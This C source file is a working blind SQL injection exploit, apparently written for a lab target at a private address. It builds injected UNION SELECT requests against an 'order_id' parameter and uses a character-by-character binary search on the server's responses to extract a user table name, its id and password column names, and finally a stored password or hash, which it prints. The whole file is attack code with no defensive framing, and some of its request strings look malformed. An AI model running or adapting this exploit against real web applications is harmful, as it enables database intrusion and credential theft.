#define __MY_DEBUG__
#include <limits.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include <netinet/ip.h>

#define WEB_ADDR 192, 168, 1, 202

union address {
    uint8_t fields[4];
    uint32_t l;
};

int32_t create_socket() {
    int32_t sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd <= 0) {
        #ifdef __MY_DEBUG__
                printf("create socket failed...\n");
        #endif
                close(sockfd);
                exit(0);
    }

    return sockfd;
}

void _listen(const int32_t sockfd) {
    if (listen(sockfd, 5) < 0) {
#ifdef __MY_DEBUG__
        printf("listen failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _bind(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (bind(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("bind failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

int32_t _accept(const int32_t sockfd) {
    struct sockaddr addr = {0};
    socklen_t addrlen = sizeof(addr);
    int32_t clientfd = accept(sockfd, &addr, &addrlen);
    if (clientfd < 0) {
#ifdef __MY_DEBUG__
        printf("accept failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return clientfd;
}

size_t _recv(const int32_t sockfd, void *  buf, size_t size) {
    ssize_t sz = recv(sockfd, buf, size, 0);
    if (sz < 0) {
#ifdef __MY_DEBUG__
        printf("recv failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
    return (size_t)sz;
}

FILE *_fopen(const char *restrict path) {
    FILE * file = fopen(path, "w");
    if (file == 0) {
        #ifdef __MY_DEBUG__
                printf("fopen failed...\n");
        #endif
                exit(0);
    }
    return file;
}

size_t _fwrite(const void *restrict ptr, size_t size, size_t nitems, FILE *restrict stream) {
    size_t written = fwrite(ptr, size, nitems, stream);

    if (written < nitems) {
        #ifdef __MY_DEBUG__
            printf("fwrite failed...\n");
        #endif
        exit(0);
    }

    return written;
}

void _sendto(const int32_t sockfd, const void *const buff, size_t buff_size,
             const uint8_t field0, const uint8_t field1,
             const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (sendto(sockfd, buff, buff_size, 0, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("sendto failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _connect(const int32_t sockfd, const uint8_t field0, const uint8_t field1,
           const uint8_t field2, const uint8_t field3, const uint16_t port) {
    struct sockaddr_in addr_in = {0};

    addr_in.sin_family = AF_INET;
    const union address address = {{field0, field1, field2, field3}};
    addr_in.sin_addr.s_addr = address.l;

    addr_in.sin_port = htons(port);

    if (connect(sockfd, (struct sockaddr *) &addr_in, sizeof(addr_in)) < 0) {
#ifdef __MY_DEBUG__
        printf("connect failed...\n");
#endif
        close(sockfd);
        exit(0);
    }
}

void _send(const int32_t client, const void * const data, size_t size) {
    if (0 > send(client, data, size, 0)) {
#ifdef __MY_DEBUG__
        perror("Sending failed...\n");
#endif
        close(client);
        exit(0);
    }
}

bool recv_empty(int32_t sockfd) {
    enum {
        CHUNK = 16
    };
    char * buf = malloc(CHUNK);
    size_t size = 0;
    *buf = 0;
    char *header_end=0;
    size_t recvd;

    while (1) {
        recvd = _recv(sockfd, buf + size, CHUNK - 1);
        if (!recvd) {
            break;
        }

        size += recvd;
        buf = realloc(buf, size+CHUNK);
        buf[size] = 0;

        header_end = strstr(buf, "\r\n\r\n");

        if (header_end) {
            break;
        }
    }
    char Content_Length[] = "Content-Length: ";
    size_t content_len = (size_t)atoi(strstr(buf, Content_Length) + sizeof(Content_Length)-1);
    size_t body_recvd = size - (size_t)(header_end+4-buf); //how much we already received from the body after the header ends
    size_t body_left = content_len - body_recvd;
    buf = realloc(buf, body_left+size+1);
    recvd = _recv(sockfd, buf + size, body_left);
    size = size + recvd;

    const char *ptr = strstr(buf, "Your order has been sent!");

    #ifdef __MY_DEBUG__
        //puts(buf);
    #endif

    free(buf);

    return ptr;
}

bool send_check_success(const char * discovered_name, int i, const char *mid, int sockfd, const char *req) {
    char mal_req[2048];
    sprintf(mal_req, req,
        discovered_name, i + 1, mid
    );

    _send(sockfd, mal_req, strlen(mal_req));

    return recv_empty(sockfd);
}

const char *url_map[96] = {
    "%20", // 0x20 Space
    "%21", // 0x21 !
    "%22", // 0x22 "
    "%23", // 0x23 #
    "%24", // 0x24 $
    "%25", // 0x25 %
    "%26", // 0x26 &
    "%27", // 0x27 '
    "%28", // 0x28 (
    "%29", // 0x29 )
    "%2A", // 0x2A *
    "%2B", // 0x2B +
    "%2C", // 0x2C ,
    "-",   // 0x2D - (Unreserved)
    ".",   // 0x2E . (Unreserved)
    "%2F", // 0x2F /

    // --- 0x30 to 0x39 (Numbers 0-9 Unreserved) ---
    "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",

    // --- 0x3A to 0x40 ---
    "%3A", // 0x3A :
    "%3B", // 0x3B ;
    "%3C", // 0x3C <
    "%3D", // 0x3D =
    "%3E", // 0x3E >
    "%3F", // 0x3F ?
    "%40", // 0x40 @

    // --- 0x41 to 0x5A (Uppercase A-Z Unreserved) ---
    "A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M",
    "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z",

    // --- 0x5B to 0x60 ---
    "%5B", // 0x5B [
    "%5C", // 0x5C \ (Backslash)
    "%5D", // 0x5D ]
    "%5E", // 0x5E ^
    "_",   // 0x5F _ (Unreserved)
    "%60", // 0x60 `

    // --- 0x61 to 0x7A (Lowercase a-z Unreserved) ---
    "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m",
    "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",

    // --- 0x7B to 0x7F ---
    "%7B", // 0x7B {
    "%7C", // 0x7C |
    "%7D", // 0x7D }
    "~",   // 0x7E ~ (Unreserved)
    "%7F"  // 0x7F DEL
};

void binary_search(char final_discovered_name[11], int sockfd, const char *req) {
#ifdef __MY_DEBUG__
    int count = 0;
#endif
    char discovered_name[33] = {0};

    for (int i = 0; i < 10; i++) {
    #ifdef __MY_DEBUG__
        printf("%i--\n", i);
    #endif
        unsigned char low = 0;
        unsigned char high = 0x60;
        unsigned char mid;
        while (low < high) {
            mid = (unsigned char)(low + (high - low) / 2);
        #ifdef __MY_DEBUG__
            count++;
        #endif
            if (send_check_success(discovered_name, i, url_map[mid], sockfd, req)) {
                high=mid;
            }
            else {
                low=mid + 1;
            }
        #ifdef __MY_DEBUG__
            printf("\t%s,%c,%c\n", discovered_name, low, high);
        #endif
        }
        if (low>=0x5f) {
            break;
        }
        strcat(discovered_name, url_map[low]);
        final_discovered_name[i] = (char) (low + 0x20);
    }
#ifdef __MY_DEBUG__
    printf("number of queries is: %d\n",count);
#endif
}

int32_t main() {
    int32_t sockfd = create_socket();

    _connect(sockfd, WEB_ADDR, 80);

    char table_name[11] = {0};

    const char *table_req = "GET /index.php?order_id=0%%20UNION%%20SELECT%%20table_name%%20FROM%%20information_schema.TABLES%%20WHERE%%20table_name%%20LIKE%%20%%27%%25usr%%25%%27%%20AND%%20table_name%%20LIKE%%20%%27%s%%25%%27%%20AND%%20SUBSTR(table_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
        " HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n";

    binary_search(table_name, sockfd, table_req);

    char id_buf[2048] = "GET /index.php?order_id=SELECT%%20column_name%%20FROM%%20information_schema.COLUMNS%%20WHERE%%20table_name%%3d%%27";

    const char *id_req_end = "%%27%%20AND%%20column_name%%20LIKE%%20%%27%%25id%%25%%27%%20AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
       " HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n";

    strcat(id_buf, table_name);
    strcat(id_buf, id_req_end);

    char id_name[11] = {0};

    binary_search(id_name, sockfd, id_buf);

    char pwd_buf[2048] = "SELECT%%20column_name%%20FROM%%20information_schema.COLUMNS%%20WHERE%%20table_name%%3d%%27";
    const char * pwd_req_end = "%%27%%20AND%%20column_name%%20LIKE%%20%%27%%25pwd%%25%%27%%20AND%%20SUBSTR(column_name,%i,1)<%%3d%%27%s%%27%%20LIMIT%%201"
        " HTTP/1.1\r\n"
        "Host: 192.168.1.202\r\n"
        "Connection: Keep-Alive\r\n"
        "\r\n";

    strcat(pwd_buf, table_name);
    strcat(pwd_buf, pwd_req_end);

    char pwd_name[11] = {0};

    binary_search(pwd_name, sockfd, pwd_buf);

    char password_buf[4096] = "GET /index.php?order_id=0%%20UNION%%20SELECT%%20";

        strcat(password_buf, pwd_name);
        strcat(password_buf, "%%20FROM%%20");
        strcat(password_buf, table_name);
        strcat(password_buf, "%%20WHERE%%20");
        strcat(password_buf, id_name);
        strcat(password_buf, "%%3d322695107%%20AND%%20SUBSTR(");
        strcat(password_buf, pwd_name);
        const char *password_req_end = ",%i,1)<%%3d%%27%s%%27%%20LIMIT%%201;"
            " HTTP/1.1\r\n"
            "Host: 192.168.1.202\r\n"
            "Connection: Keep-Alive\r\n"
            "\r\n";

        strcat(password_buf, password_req_end);

        char final_password[11] = {0};

        binary_search(final_password, sockfd, password_buf);

        printf("Found Password/Hash: %s\n", final_password);





#ifdef __MY_DEBUG__
    puts(table_name);
#endif

    close(sockfd);
}
